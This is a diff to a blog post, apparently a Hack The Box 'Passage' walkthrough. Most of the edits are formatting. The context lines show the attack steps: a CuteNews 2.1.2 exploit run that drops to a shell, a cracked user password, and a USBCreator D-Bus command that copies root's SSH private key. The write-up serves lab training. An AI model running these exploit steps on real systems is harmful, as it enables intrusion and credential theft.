@@ -2,12 +2,13 @@
 date: 2021-03-06 16:00:00
 language: en-US
 localeid: htb-passage
-authors: ['default']
+authors:
+  - default
 tags:
-- Walkthrough
-- HackTheBox
-- HTB Medium
-- HTB Linux
+  - Walkthrough
+  - HackTheBox
+  - HTB Medium
+  - HTB Linux
 title: 'Walktrough: HTB Passage'
 ---
 
@@ -15,8 +16,9 @@ Hello everyone!
 
 The box of this week will be Passage, a medium-rated Linux box from Hack The Box created by [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851).
 
-:information_source: **Info**: Write-ups for Hack The Box are always posted as soon as machines get retired.
-
+<Alert kind="info" title="Info">
+  Write-ups for Hack The Box are always posted as soon as machines get retired.
+</Alert>
 
 ![HTB Passage](https://i.imgur.com/tX69Xey.png)
 
@@ -42,7 +44,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: Passage News
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/
 Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
 ```
 
@@ -75,7 +77,7 @@ After some research about the product, found the administration page at `http://
 
 ## Initial Foothold
 
-Checking existing exploits for this product version, found 4 alternatives in `searchsploit` where I've used the last one, **48800**,  to which I also needed to make some adjustments.
+Checking existing exploits for this product version, found 4 alternatives in `searchsploit` where I've used the last one, **48800**, to which I also needed to make some adjustments.
 
 ```bash
 searchsploit cutenews 2.1.2
@@ -97,17 +99,17 @@ $ python3 48800.py
 
 
 
-           _____     __      _  __                     ___   ___  ___ 
+           _____     __      _  __                     ___   ___  ___
           / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
-         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
-         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
-                                ___  _________                        
-                               / _ \/ ___/ __/                        
-                              / , _/ /__/ _/                          
-                             /_/|_|\___/___/                          
-                                                                      
+         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
+         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
+                                ___  _________
+                               / _ \/ ___/ __/
+                              / , _/ /__/ _/
+                             /_/|_|\___/___/
 
-                                                                                                                                                   
+
+
 
 [->] Usage python3 expoit.py
 
@@ -137,7 +139,7 @@ logged in user: T6iejum4p0
 Dropping to a SHELL
 ============================
 
-command > 
+command >
 ```
 
 Cracking these hashes using john found a password **atlanta1**, which belongs to user **paul**, which I have discovered after some edits in the script to disclose this information, as seen below.
@@ -215,7 +217,7 @@ paul@passage:~$
 
 ## Root flag
 
-First thing to do with *paul* credentials was another attempt to exploit USBCreator vulnerability, which failed just like www-data due to insufficient privileges.
+First thing to do with _paul_ credentials was another attempt to exploit USBCreator vulnerability, which failed just like www-data due to insufficient privileges.
 
 Analyzing the user's home directory, found a RSA keypair where Paul authored it to ssh without credentials adding the public key inside `authorized_keys` file.
 
@@ -253,7 +255,7 @@ nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path 
 If you want to truly get root and an interactive shell there are some possibilities that we must try:
 
 - Obtain a copy of `/etc/shadow`, unshadow it and crack the passwords using John or Hashcat, which didn't worked for me with the dictionaries used;
-- Verify the existence of  `id_rsa` file inside root profile, as well as the presence of it in the **authorized_keys**, which was the option we had success as below and obtained the root flag:
+- Verify the existence of `id_rsa` file inside root profile, as well as the presence of it in the **authorized_keys**, which was the option we had success as below and obtained the root flag:
 
 ```bash
 nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/somefilename true
